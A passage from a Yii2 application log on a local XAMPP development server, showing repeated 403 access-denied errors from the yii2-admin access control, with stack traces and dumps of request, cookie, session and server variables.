    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58651'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a67769d83c'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a67769d83c'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a67769d83c'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629559.0155
    'REQUEST_TIME' => 1769629559
]
2026-01-28 15:46:08 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ind...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:46:08 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58654'
    'REDIRECT_URL' => '/admin/route/index'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/index'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629568.0143
    'REQUEST_TIME' => 1769629568
]
2026-01-28 15:46:09 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:46:08 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a67806b17e'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58654'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a67806b17e'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a67806b17e'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a67806b17e'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629568.7494
    'REQUEST_TIME' => 1769629568
]
2026-01-28 15:46:28 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ind...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:46:27 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_CACHE_CONTROL' => 'max-age=0'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58655'
    'REDIRECT_URL' => '/admin/route/index'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/index'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629587.5989
    'REQUEST_TIME' => 1769629587
]
2026-01-28 15:46:28 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:46:28 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a6794496dc'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58658'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a6794496dc'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
